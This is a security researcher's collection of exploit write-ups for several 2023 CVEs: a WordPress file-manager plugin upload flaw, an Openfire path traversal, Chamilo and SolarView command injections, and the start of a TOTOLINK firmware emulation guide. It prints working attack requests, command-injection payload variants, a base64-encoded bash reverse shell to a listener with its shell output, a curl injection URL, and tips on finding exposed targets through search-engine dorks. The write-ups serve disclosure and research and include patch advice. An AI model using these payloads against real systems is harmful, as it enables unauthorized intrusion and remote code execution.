X-Content-Type-Options: nosniff
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Pragma: no-cache
Set-Cookie: PHPSESSID=h7komipqhl6l43bfq0beqgi23f; path=/
Content-Length: 1742
Connection: close
Content-Type: application/json; charset=utf-8

{"added":[
   {
     "isowner":false,
     "ts":1687886014,
     "mime":"image\/png",
     "read":1,
     "write":1,
     "size":"592",
     "hash":"l1_cnVieS5wbmc",
     "name":"ruby.png",
     "phash":"l1_Lw",
     "tmb":1,
     "url":"http:\/\/192.168.201.10\/wordpress\/ruby.png"
   }
],
```
What if we try to bypass authentication by removing the cookies. Will that work?
Of course, the file gets nicely uploaded again.

Last but not least, can manipulate the mime-types to upload PNG images files with embedded PHP code that we can execute.
And again the answer is yes. See this [video](https://youtu.be/2D-GBNQchPw) on `YouTube`.

Basically,  you can manipulate all parameters as long as you have the `_fmakey`. This is the only parameter that needs to be set to issue a `POST` request that allows for all kind of operations, like upload, download and others.

What is exactly this `_fmakey` and more important, where do we find it?

I could not find much on this key, but we need to set this key to get the `POST` request satisfied.
Man would think that it would be encrypted during runtime with a complex encryption algorithm, but the reality is much simpler.
The `_fmakey` and its value is stored on the web page where File Manager Advanced shortcode functionality is embedded. With view source you can easily find it on the web page (see the excerpt below).

```html
<script src='http://192.168.201.10/wordpress/wp-content/plugins/file-manager-advanced-shortcode/js/shortcode.js?ver=6.2.2' id='file_manager_advanced-fma-shortcode-js-js'></script>
<script id='file_manager_advanced-fma-shortcode-js-js-after'>
jQuery(document).ready(function(){
	var afmui = ['toolbar', 'tree', 'path', 'stat'];
	var fma_ui_opt = '';
	if(fma_ui_opt != '') {
	  var fmui_params = fma_ui_opt;
	if(fmui_params == 'files') {
	  var afmui = [];
	} else 
	  var afmui = fmui_params.split(',');
	 }
   jQuery('#file_manager_advanced').elfinder(
	  {
		  cssAutoLoad : false, 
		  url : 'http://192.168.201.10/wordpress/wp-admin/admin-ajax.php',						
		  lang:  'en',					
		  defaultView : 'grid',
		  dateFormat : 'M d, Y h:i A',
		  customData : {action: 'fma_load_shortcode_fma_ui',
		 _fmakey: 'd2ef442bd5',
		  path:'wp-content',
		  url: '',
		  w: 'false',
		  r: 'true',
		  hide: 'plugins',
		  operations: 'download,upload',
		  path_type: 'inside',
		  hide_path: 'no',
		  enable_trash: 'no',
		  upload_allow: 'image/png',
		  upload_max_size: '2G',
	      },
		  height: '',
		  width: '',
		  ui: afmui,
	  });
});
</script>
```
For older versions of the plugin, you have to search for the `_fmakey` on the page embedded in the `fmaatts var`.
```
var fmaatts = {"ajaxurl":"http:\/\/192.168.201.55\/wp-admin\/admin-ajax.php","lang":"us","view":"grid","dateformat":"M d, Y h:i A","action":"fma_load_shortcode_fma_ui","fmakey":"92b7949dd9","path":"wp-content\/uploads\/musicfiles","url":"","w":"false","r":"true","hide":"plugins","operations":"all","path_type":"inside"};
```
Well, how easy can you make it for an attacker to craft a `POST` request that uploads a malicious file with payload that can be executed.
I would say, **DEAD EASY!!!**

The steps are simple.
1. Find `WordPress` web sites with pages where the `_fmakey` is embedded (TIP: use a Source Code Search Engine like PublicWWW).
2. Retrieve the `_fmakey`.
3. Craft a `POST` request that uploads a malicious PNG file with PHP code embedded by using the `_fmakey` and manipulating the `cmd`, `operations` and `mime-types` parameters.
4. Execute the malicious PNG file and enjoy a `reverse shell` or `meterpreter`.

Of course, I took the liberty to code a nice Metasploit module that does it all for you.
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/wp_plugin_fma_shortcode_unauth_rce.rb) in my local repository or as [PR 18142](https://github.com/rapid7/metasploit-framework/pull/18142) at the Metasploit Github development.

I have tested the module on a `WordPress` base installation version `6.2.2` on `Linux` and `Windows Server 2019` with `File Manager Advanced 5.0.5` and `File Manager Advanced Shortcode 2.3.2` installed.  Works as a charm...

Also tested the module with a basic setup of  `WordFence` and it bypassed the `WAF` as far as I could test it.

### Mitigation
Please update your `File Manager Advanced` plugin to version `5.1` or higher and update the `File Manager Advanced Shortcode` plugin to version `2.4` or higher.

### References
[WPScan advisory](https://wpscan.com/vulnerability/58f72953-56d2-4d86-a49b-311b5fc58056)
[File Manager Advanced Shortcode RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/wp_plugin_fma_shortcode_unauth_rce.rb)
[Metasploit PR 18142](https://github.com/rapid7/metasploit-framework/pull/18142)
[Exploit DB](https://www.exploit-db.com/exploits/51505)
[Packet Storm](https://packetstormsecurity.com/files/172707/File-Manager-Advanced-Shortcode-2.3.2-Remote-Code-Execution.html)

### Credits
` Mateus Machado Tesser` Discovery


---

## CVE-2023-32315
*Posted 2023-07-09 · last revised 2023-12-19*

> Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the yet-to-be released first version on the 4.8 branch (which is expected to be version 4.8.0). Users are advised to upgrade. If an Openfire upgrade isn’t available for a specific release, or isn’t quickly actionable, users may see the linked github advisory (GHSA-gw42-f939-fhvm) for mitigation advice.

`Openfire` (previously known as Wildfire, and Jive Messenger) is an instant messaging (IM) and groupchat server for the Extensible Messaging and Presence Protocol (XMPP). It is written in Java and licensed under the Apache License 2.0.

On May 26, 2023, `Openfire's` administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment using the path `http://localhost:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/`. Endpoints such as `log.jsp`, `user-groups.jsp` and `user-create.jsp` can be used to gain unauthorized admin access.
It allows an unauthenticated user to use the unauthenticated `Openfire` Setup Environment in an already configured `Openfire` environment to access restricted pages in the `Openfire Admin Console` reserved for administrative users.

The vulnerability affects all versions of `Openfire` that have been released since April 2015, starting with version `3.10.0` and is patched in `Openfire` release `4.7.5`, `4.6.8` and `4.8.0` and later.

Reading the security advisory, it reminded me of a previous `Openfire` vulnerability [CVE-2008-6508](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-6508) discovered in 2008 that faced a similar issue. There is even an existing Metasploit module available a.k.a. `exploit\multi\http\openfire_auth_bypass` that exploits this vulnerability (see Metasploit [PR 522](https://github.com/rapid7/metasploit-framework/pull/522)).

With that in mind, it should be not too difficult to build a new variant that exploits the latest vulnerability [CVE-2023-32315](https://nvd.nist.gov/vuln/detail/CVE-2023-32315).

The attack sequence is quite simple:
1. Grab the cookies using the path traversal vulnerability via `http://<IP>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp`
2. Use the cookies to add an admin user using the path traversal vulnerability via `http://<IP>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp`
3. Upload an Openfire plugin weaponized with a java payload triggering an RCE via endpoint `http://<IP>:9090/plugin-admin.jsp`. For step 3, you need understand how to create an customized `Openfire` plugin which is described in more detail [here](https://download.igniterealtime.org/openfire/docs/latest/documentation/plugin-dev-guide.html).

And as usual, I took the liberty to code a nice Metasploit module that does it all for you.
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/openfire_auth_bypass_rce_cve_2023_32315.rb) in my local repository or as [PR 18173](https://github.com/rapid7/metasploit-framework/pull/18173) at the Metasploit Github development.

This module has been tested on:

**Ubuntu Linux 22.04**
  - Openfire 3.10.1, 4.0.4, 4.1.0, 4.2.0, 4.3.0, 4.4.0, 4.5.0, 4.6.0. 4.7.0, 4.7.1, 4.7.3
  - Java 7, 8, 17

**Windows Server 2019 Datacenter**
  - Openfire 4.7.3
  - Java 20

You can setup your own testing environment  by following the instructions below.

**Instructions for an Openfire installation:**
Download Openfire releases [here](https://github.com/igniterealtime/Openfire/releases?page=1).
Follow installation instructions [here](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html).

### Mitigation
Please update your `Openfire` application to version `4.8.0` or higher and or upgrade to the patched versions `4.7.5` or `4.6.8`.

### References
[Igniterealtime Security Advisory](https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm)
[CVE-2023-32315](https://nvd.nist.gov/vuln/detail/CVE-2023-32315)
[Openfire Authentication Bypass RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/openfire_auth_bypass_rce_cve_2023_32315.rb)
[Metasploit PR 18173](https://github.com/rapid7/metasploit-framework/pull/18173)
[Openfire plugin development](https://download.igniterealtime.org/openfire/docs/latest/documentation/plugin-dev-guide.html)
[Openfire release downloads](https://github.com/igniterealtime/Openfire/releases?page=1)
[Openfire installation instructions](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)

---

## CVE-2023-34960
*Posted 2023-07-28 · last revised 2023-08-16*

> A command injection vulnerability in the wsConvertPpt component of Chamilo v1.11.* up to v1.11.18 allows attackers to execute arbitrary commands via a SOAP API call with a crafted PowerPoint name.

`Chamilo` is a free software (under GNU/GPL licensing) e-learning and content management system, aimed at improving access to education and knowledge globally. It has been used by more than 30M people worldwide since its inception in 2010.
The following `Shodan` dork: `http.component:"Chamilo"` will give you the list of `Chamilo` installations running in the wild.

`Chamilo` versions `1.11.18` and below suffers from an unauthenticated remote command execution vulnerability. Due to a functionality called `Chamilo Rapid` to easily convert PowerPoint slides to courses on `Chamilo`, it is possible for an unauthenticated remote attacker to execute arbitrary commands at OS level using a malicious SOAP request at the vulnerable endpoint `/main/webservices/additional_webservices.php`.

It is a classical example of OS command injection (also known as shell injection) that allows an attacker to execute an arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

In the vulnerable file `/main/webservices/additional_webservices.php` the function `wsConvertPpt` that can be used to convert a PowerPoint file to courses on `Chamilo` using a shell command  . To use this feature, a SOAP request needs to be performed containing an URL pointing to the PowerPoint file.
In code excerpt below, you can easily identify the command line where the `filename` is not properly filtered by the function, hence making it vulnerable to command injection when it is called by the `exec()` function. 

```php
function wsConvertPpt($pptData)
{
    global $_configuration;
    $ip = trim($_SERVER['REMOTE_ADDR']);
    // If an IP filter array is defined in configuration.php,
    // check if this IP is allowed
    if (!empty($_configuration['ppt2lp_ip_filter'])) {
        if (!in_array($ip, $_configuration['ppt2lp_ip_filter'])) {
            return false;
        }
    }
    $fileData = $pptData['file_data'];
    $dataInfo = pathinfo($pptData['file_name']);
    $fileName = basename($pptData['file_name'], '.'.$dataInfo['extension']);
    $fullFileName = $pptData['file_name'];
    $size = $pptData['service_ppt2lp_size'];
    $w = '800';
    $h = '600';
    if (!empty($size)) {
        list($w, $h) = explode('x', $size);
    }

    $tempArchivePath = api_get_path(SYS_ARCHIVE_PATH);
    $tempPath = $tempArchivePath.'wsConvert/'.$fileName.'/';
    $tempPathNewFiles = $tempArchivePath.'wsConvert/'.$fileName.'-n/';

    $oldumask = umask(0);
    //$perms = api_get_permissions_for_new_directories();
    // Set permissions the most permissively possible: these files will
    // be deleted below and we need a parallel process to be able to write them
    $perms = api_get_permissions_for_new_directories();
    pptConverterDirectoriesCreate($tempPath, $tempPathNewFiles, $fileName, $perms);

    $file = base64_decode($fileData);
    file_put_contents($tempPath.$fullFileName, $file);

    $cmd = pptConverterGetCommandBaseParams();

/* VULNERABLE CODE */
    $cmd .= ' -w '.$w.' -h '.$h.' -d oogie "'.$tempPath.$fullFileName.'"  "'.$tempPathNewFiles.$fileName.'.html"';

    //$perms = api_get_permissions_for_new_files();
    chmod($tempPathNewFiles.$fileName, $perms);

    $files = [];
    $return = 0;

/* EXEC FUNCTION */
    $shell = exec($cmd, $files, $return);

    umask($oldumask);
```
By using the SOAP request below, you can trigger the command injection replacing `YOUR COMMAND` with any Unix OS command.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost:80/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:wsConvertPpt>
     <param0 xsi:type="ns2:Map">
      <item>
       <key xsi:type="xsd:string">file_data</key>
       <value xsi:type="xsd:string"></value>
      </item>
      <item>
        <key xsi:type="xsd:string">file_name</key>
        <value xsi:type="xsd:string">`YOUR COMMAND`.pptx</value>
       </item>
       <item>
        <key xsi:type="xsd:string">service_ppt2lp_size</key>
        <value xsi:type="xsd:string">720x540</value>
       </item>
    </param0>
   </ns1:wsConvertPpt>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
I did several tests on a Ubuntu 22.04 server with `Chamilo 1.11.18` installed to see which command injections do work and I found three variants so far. Two blind command injections and one command injection that is not blind.

**Blind variants:**
- ```<value xsi:type="xsd:string">`command`.pptx</value>```
- ```<value xsi:type="xsd:string">|" |command||a #`.pptx'</value>```

**Non blind variant:**
- ```<value xsi:type="xsd:string">`{{}}`.pptx'|" |command||a #</value>```

Let's quick demonstrate the non-blind command injection variant with `burpsuite` on a vulnerable `Chamilo` installation.

**Burp request**
```html
POST /chamilo/main/webservices/additional_webservices.php HTTP/1.1
Host: 192.168.201.47
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: text/xml; charset=utf-8
Content-Length: 1031
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
  xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:ns1="/chamilo"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
  xmlns:ns2="http://xml.apache.org/xml-soap"
  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
  SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:wsConvertPpt>
      <param0 xsi:type="ns2:Map">
        <item>
          <key xsi:type="xsd:string">file_data</key>
          <value xsi:type="xsd:string"></value>
        </item>
        <item>
          <key xsi:type="xsd:string">file_name</key>
                   <value xsi:type="xsd:string">`{{}}`.pptx'|" |echo cuckoo||a #</value>
        </item>
        <item>
          <key xsi:type="xsd:string">service_ppt2lp_size</key>
          <value xsi:type="xsd:string">1310x643</value>
        </item>
      </param0>
    </ns1:wsConvertPpt>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
**Burp Response**
```html
HTTP/1.1 200 OK
Date: Fri, 28 Jul 2023 10:33:56 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: ch_sid=0doq0i6i2va7rf61bfq9ksg79u; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 620
Vary: Accept-Encoding
Connection: close
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
  xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:ns1="http://192.168.201.47/chamilo/main/webservices/"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
  SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
   <SOAP-ENV:Body>
     <ns1:wsConvertPptResponse>
       <return xsi:type="xsd:string">
          a:2:{s:5:"files";a:1:{i:0;s:6:"cuckoo";}s:6:"images";a:1:{s:0:"";s:0:"";}}
       </return>
     </ns1:wsConvertPptResponse>
   </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
Now let's do a proper command injection and spawn a remote shell.
Let's take a bash reverse shell: `bash -i >& /dev/tcp/192.168.201.10/4444 0>&1`
To avoid any issues with bad characters, we will encode the payload with `base64` and decode it again during execution.
```console
# echo -n "bash -i >& /dev/tcp/192.168.201.10/4444 0>&1"|base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS4xMC80NDQ0IDA+JjE=
# nc -lnvp 4444
listening on [any] 4444 ...
```
**bash reverse shell burp request**
```html
POST /chamilo/main/webservices/additional_webservices.php HTTP/1.1
Host: 192.168.201.47
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: text/xml; charset=utf-8
Content-Length: 1084
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
  xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:ns1="/"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
  xmlns:ns2="http://xml.apache.org/xml-soap"
  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
  SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:wsConvertPpt>
      <param0 xsi:type="ns2:Map">
        <item>
          <key xsi:type="xsd:string">file_data</key>
          <value xsi:type="xsd:string"></value>
        </item>
        <item>
          <key xsi:type="xsd:string">file_name</key>
          <value xsi:type="xsd:string">`{{}}`.pptx'|" |echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS4xMC80NDQ0IDA+JjE=|base64 -d|bash||a #</value>
        </item>
        <item>
          <key xsi:type="xsd:string">service_ppt2lp_size</key>
          <value xsi:type="xsd:string">1108x524</value>
        </item>
      </param0>
    </ns1:wsConvertPpt>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
**bash reverse shell**
```console
# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.201.10] from (UNKNOWN) [192.168.201.47] 49682
bash: cannot set terminal process group (35632): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cuckoo:/var/www/html/chamilo/main/inc/lib/ppt2png$ uname -a
uname -a
Linux cuckoo 5.15.0-76-generic #83-Ubuntu SMP Thu Jun 15 19:16:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
www-data@cuckoo:/var/www/html/chamilo/main/inc/lib/ppt2png$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cuckoo:/var/www/html/chamilo/main/inc/lib/ppt2png$
```
For now, the OS command injection only works on `linux/unix` based operating systems due to the use of the backtic \` operator.
Still playing around to find a Windows variant.

And as usual, there is a nice Metasploit module that does it all for you.
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/chamilo_unauth_rce_cve_2023_34960.rb) in my local repository or as [PR 18233](https://github.com/rapid7/metasploit-framework/pull/18233) at the Metasploit Github development.

This module has been tested on:
* Ubuntu Linux 22.04
* Chamilo 1.11.18
* PHP 7.4

**Instructions for a vulnerable Chamilo  installation on Ubuntu 22.04:**
* [Follow these instructions](https://linux.how2shout.com/how-to-install-ubuntu-22-04-server-on-virtualbox/) to download and install Ubuntu 22.04 server on VirtualBox. 
* [Follow these instructions](https://linux.how2shout.com/2-ways-to-install-lamp-server-on-ubuntu-22-04-20-04/) to download and install LAMP on Ubuntu 22.04 server. 
* Download Chamilo `1.11.18` release from [here](https://github.com/chamilo/chamilo-lms/releases).
* [Follow these instructions](https://11.chamilo.org/documentation/installation_guide.html#1._Pre-requisites) to install Chamilo.

### Mitigation
Please update your `Chamilo` application to version `1.11.20` or higher.

### References
[Randorisec advisory](https://www.randorisec.fr/pt/chamilo-1.11.18-multiple-vulnerabilities)
[CVE-2023-34960](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34960)
[Chamilo Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/chamilo_unauth_rce_cve_2023_34960.rb)
[Metasploit PR 18233](https://github.com/rapid7/metasploit-framework/pull/18233)
[Chamilo release downloads](https://github.com/chamilo/chamilo-lms/releases)
[Chamilo installation instructions](https://11.chamilo.org/documentation/installation_guide.html#1._Pre-requisites)

### Credits
[Randorisec](mailto:contact@randorisec.fr)

---

## CVE-2023-23333
*Posted 2023-08-23 · last revised 2023-08-28*

> There is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions through downloader.php.

With the heat records breaking almost every day around the globe, Solar Energy solutions are becoming rapidly main stream in households around the world. If you look in the street where you live, you will probably find a few neighbors with solar panels installed on their roof and nice little apps that can track you solar energy capacity.
Cool stuff, but as always, when connected to the Internet, you can introduce an entry point for a attacker to hack into your solar energy devices / inverters. `Cyble ` security analysts recently published a nice report that explains the [Security Gaps in Green Energy Sector: Unveiling the Hidden Dangers of Public-Facing PV Measuring and Diagnostics Solutions](https://cyble.com/blog/security-gaps-in-green-energy-sector/).

One of these energy solution providers is a Japanese company called `Contec`, that provides Solar Energy solutions to the market. One of their solutions, [SolarView Compact](https://www.contec.com/products-services/environmental-monitoring/solarview/) has a vulnerability that allows remote code execution on  a vulnerable `SolarView Compact` device by bypassing internal restrictions through the vulnerable endpoint `downloader.php` using the `file` parameter. Firmware versions up to `v6.33` are vulnerable.

Again a very basic case of using direct system calls in your application code without sanitizing the input parameters properly.

If you analyze `downloader.php`,  you easily can identify the vulnerable code that triggers the remote code execution with a malicious request.
You can retrieve this information by downloading the [SolarView Compact firmware v600](https://www.contec.com/download/contract/contract2/?itemid=b28c8b7c-9f40-40b2-843c-b5b04c035b0e&downloaditemid=d76a935b-adbc-45ff-b80f-6f651c1af463). You need to register yourself before you can download the firmware `svcUpdateV600.fpk`.

Run the following commands to access the firmware and extract `downloader.php`.
```console
# mv svcUpdateV600.fpk svcUpdateV600.gz
# tar -ztvf./svcUpdateV600.gz html/downloader.php
-rwxr--r--  0 nobody nogroup  1986 Dec  7  2018 html/downloader.php
# tar -zxvf./svcUpdateV600.gz html/downloader.php
x html/downloader.php
```
```php
// downloader.php
<?
if( isset($_REQUEST['file']) ){
    $file = $_REQUEST['file'];
}

//
function get_extend( $filename ){
    $pos = strrpos( $filename, "." );
    return substr( $filename, $pos );
}

//
//
$ext = get_extend( $file );
//
switch( $ext ){
case ".csv":
    break;
case ".jpg":
case ".jpeg":
case ".JPG":
case ".JPEG":
case ".Jpeg":
case ".Jpg":
case ".gif":
case ".GIF":
case ".Gif":
    $path = "/home/www/html/images/";
    break;
case ".zip":
    // $file is not proper sanitized !!!!
    $ARCH_FILE = sprintf("/home/contec/data/%s", $file);
    if( file_exists($ARCH_FILE) ){
        unlink($ARCH_FILE);
    }
    $cmd = sprintf("/usr/local/bin/data_zip.sh %s > /dev/null", basename($ARCH_FILE));
     // Using a direct system call can trigger the RCE !!!!
    system($cmd);
    $file = $ARCH_FILE;
    break;
}
....
```
A short demonstration below shows how easy it is to trigger the RCE.

**Malicious burp request** using `curl http://TARGET-IP/downloader.php?file=%3Bid%3B.zip`
```html
GET /downloader.php?file=%3Bid%3B.zip HTTP/1.1
Host: <TARGET-IP>
User-Agent: curl/7.88.1
Accept: */*
Connection: close
```
**Burp response**
```html
HTTP/1.1 200 OK
X-Powered-By: PHP/5.2.17
Content-type: text/html
Connection: close
Date: Wed, 23 Aug 2023 08:09:07 GMT
Server: lighttpd/1.4.28
Content-Length: 1072

5000 rows exported. -> /tmp/history.csv
	zip warning: name not matched: images/slide_monthly_guide.png
	zip warning: name not matched: images/slide_daily_guide.png
zip I/O error: Not a directory
zip error: Could not create output file (/home/contec/data/.zip)
uid=1001(contec) gid=0(root)
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<HTML>
<HEAD>
	<META HTTP-EQUIV="Content-Type" CONTENT="text/css; charset=Shift_JIS">
	<LINK HREF="/css/style1.css" REL="stylesheet" TYPE="text/css">
	<LINK REL="SHORTCUT ICON" HREF="/favicon.ico">
	<TITLE>Error 404</TITLE>
</HEAD>
<BODY>
....
```
I will leave it to the readers imagination what else you can run then a simple `id` command, but the underlying `Linux armle` operating system has a nice rich command set such as `nc`, `wget`, `bash`, `python`, `openssl` and `base64` that can be leveraged for your RCE.
And as you can see, we already get a little bonus because default the security context of the user `contec`, which is running the service, is part of the `root` group that gives us elevated privileges.

A Metasploit module is in development.
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/solarview_unauth_rce_cve_2023_23333.rb) in my local repository or as [PR 18313](https://github.com/rapid7/metasploit-framework/pull/18313) at the Metasploit Github development.

### Mitigation
Please update your `SolarView Compact` application to the latest available firmware which is `v8.00` or higher.

### References
[SolarView Compact](https://www.contec.com/products-services/environmental-monitoring/solarview/) 
[Security Gaps in Green Energy Sector](https://cyble.com/blog/security-gaps-in-green-energy-sector/)
[CVE-2023-23333](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23333)
[SolarView Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/solarview_unauth_rce_cve_2023_23333.rb)
[Metasploit PR 18313](https://github.com/rapid7/metasploit-framework/pull/18313)

### Credits
To all good fellows who raised this concern ;-)


---

## CVE-2023-30013
*Posted 2023-09-13 · last revised 2023-09-15*

> TOTOLINK X5000R V9.1.0u.6118_B20201102 and V9.1.0u.6369_B20230113 contain a command insertion vulnerability in setting/setTracerouteCfg. This vulnerability allows an attacker to execute arbitrary commands through the "command" parameter.

Zioncom (Hong Kong) Technology Limited is a professional manufacturer for network communication products, including Wireless Router/AP (Indoor & Outdoor) , 4G&5G Router, Wireless Extender, Wireless USB Adapter, Wireless Module, Switch and Wired Router.
They are launching a large portfolio their network products under the brand name TOTOLINK. Despite the fact that they are in the business of developing and designing network products, a lot of their solutions are flawed in terms of security. Dozens of their products and related firmware are subject to buffer overflows and command injections and this CVE is only one of the many out there.

I took this CVE to the focus a bit more on the analysis of firmware and how you test your firmware without having the hardware actually in hand using firmware emulation.
[Firmadyne](https://github.com/firmadyne/firmadyne) is one of most popular firmware analysis and emulation software and is available in the public domain where you can install it freely on your Linux distribution. Now before you jump in cloning the repository and start the installation, I want to outline two other firmware analysis and emulation tools that probably makes your life a bit easier. 
The first one is [Firmware Analysis Toolkit (FAT)](https://github.com/attify/firmware-analysis-toolkit) which is basically a script to automate `Firmadyne`. If you do not want to bother with complex installation,  you can try [AttifyOS](https://github.com/adi0x90/attifyos) which has Firmware Analysis Toolkit and other tools pre-installed and ready to use.
The other tool that you can use is called [FirmAE](https://github.com/pr0v3rbs/FirmAE) which is a fully-automated framework that performs emulation and vulnerability analysis. `FirmAE` significantly increases the emulation success rate (From Firmadyne's 16.28% to 79.36%) with five arbitration techniques. 

In my case, I settled for `FirmAE`, because it indeed increases the success rate of firmware emulation considerably. There is a very nice [Paper](https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf) that explains the architecture and  techniques used and I would advice you to read this first before jumping into the installation and operation of the tool.

Ok let's go down to business and do some analysis and emulation with `FirmAE`. 
I installed `FirmAE` on my Kali Linux distribution (2023.4) using the installation instructions provided on the github page. To emulate the specific firmware that comes with the TOTOLINK X5000R, `binwalk` need to be able to handle a sasquatch filesystem which requires a bit of additional installation and compilation steps that you can find [here](https://gist.github.com/thanoskoutr/4ea24a443879aa7fc04e075ceba6f689). Please do not forget to run this after your `FirmAE` installation otherwise you will not be able to extract the firmware.

Ok, when everything is installed, let's download  the vulnerable firmware from TOTOLINK [here](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html). We need `V9.1.0u.6118_B20201102` ~~and `V9.1.0u.6369_B20230113 `~~.

**UPDATE 14 September 2023**
I could not reproduce the exploit with X5000R firmware `V9.1.0u.6369_B20230113.rar`, so please use `V9.1.0u.6118_B20201102.zip` for your testing.
I have also discovered other TOTOLINK firmware that is vulnerable for the same exploit.
* Wireless Dual Band Gigabit Router model A7000R with firmware `A7000R_V9.1.0u.6115_B20201022.zip`
* Wireless Dual Band Gigabit Router model A3700R with firmware `A3700R_V9.1.2u.6134_B20201202.zip`
* Wireless N Router model N200RE V5 with firmware `N200RE_V5_V9.3.5u.6095_B20200916.zip` and `N200RE_V5_V9.3.5u.6139_B20201216.zip`
* Wireless N Router model N350RT with firmware `N350RT_V9.3.5u.6095_B20200916.zip` and `N350RT_V9.3.5u.6139_B20201216.zip`
* Wireless Extender model EX1200L with firmware `EX1200L_V9.3.5u.6146_B20201023.zip`
* And probably more looking at the scale of impacted devices :-(

We are now ready to start the emulation. With `FirmAE`, you have different options such as a check option (-c) to see if your firmware can be emulated or a run option (-r) to emulate your firmware. I always use the debug option (-d) because it gives you the ability to access the firmware via a console for debugging and analysis purposes.
First run `./init.sh` to start initialize the Postgress database.
Now run the debug session by running the following command `./run.sh -d TOTOLINK X5000R_V9.1.0u.6118_B20201102.zip`
This will take a while, but in the end you should see the following... 

**TIP:** you can speed this up by setting the arbitrary option `FIRMAE_ETC` in `firmae.config` to false (however, not necessary to make below work).
```ShellSession
# ./run.sh -d TOTOLINK /root/FirmAE/firmwares/X5000R_V9.1.0u.6118_B20201102.zip
[*] /root/FirmAE/firmwares/X5000R_V9.1.0u.6118_B20201102.zip emulation start!!!
[*] extract done!!!
[*] get architecture done!!!
mke2fs 1.47.0 (5-Feb-2023)
